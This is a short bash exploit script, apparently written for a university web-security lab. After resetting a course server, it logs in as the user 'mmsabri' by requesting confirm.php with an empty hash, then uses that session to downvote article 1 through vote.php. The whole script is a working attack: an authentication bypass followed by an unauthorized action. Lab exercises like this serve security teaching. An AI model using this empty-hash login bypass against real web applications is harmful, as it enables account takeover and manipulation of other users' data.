#!/bin/bash
url=$1;

curl -b cookies.txt "http://ugster05.student.cs.uwaterloo.ca/reset/tjwlim";
echo "Login as 'mmsabri'... by Logging in with empty hash"
curl -b cookies.txt "$url/confirm.php?hash=";
echo "Downvote Article 1"
curl -b cookies.txt "$url/vote.php?id=1&vote=-1";
echo -e "\033[32mDone!\033[0m"
